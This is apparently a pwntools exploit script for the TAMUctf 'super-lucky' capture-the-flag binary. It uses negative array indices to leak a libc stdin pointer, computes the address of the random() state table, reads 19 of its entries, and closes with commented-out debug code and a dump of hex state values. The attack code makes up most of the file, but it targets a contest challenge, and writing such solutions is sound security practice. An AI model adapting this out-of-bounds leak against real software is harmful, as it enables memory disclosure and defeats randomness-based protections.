from pwn import *

exe = ELF('./super-lucky_patched')
libc = ELF('./libc.so.6')
context.binary = exe.path

io = remote("tamuctf.com", 443, ssl=True, sni="super-lucky")
# io = process('./super-lucky_patched')

io.sendlineafter(b':', b'-3')
io.recvuntil(b':')
x = int(io.recvline())

io.sendline(b'-4')
io.recvuntil(b':')
y = int(io.recvline())

lucky_numbers_address = 0x404040
stdin_address = (x << 32) + y
randtbl = stdin_address - 2096 - 16

print(x)
print(y)
print(hex(stdin_address))

T = []
for i in range(19):
    io.sendline(str((randtbl - lucky_numbers_address) // 4 + i).encode())
    io.recvuntil(b':')
    T.append(int(io.recvline()))

print(T)


io.interactive()


# io = process(exe.path)
# if args.GDB:
#     io = gdb.debug(exe.path, """
#         b *main
#         b *main+217
#         continue
#     """)
# elif args.REMOTE:
#     io = remote("tamuctf.com", 443, ssl=True, sni="super-lucky")

# for _ in range(21):
#     io.sendline(b'1')

# io.interactive()
# 2204
"""
{
0x00000003,      0x8cbae691,      0xc2c54c25,      0x45600d74,
0x5b9ecc53,      0x0eff252a,      0xd29e96fc,      0x7ab13b31,
0x8412cf4f,      0xf40378e9,      0xaf022dbe,      0x6d3b75c3,
0x79c15a7b,      0x37ea553a,      0x793b88e5,      0xacfbd89a,
0x7b55b29c,      0xe1555a93,      0xf9f38a6e,      0xb66d9ab6
}
"""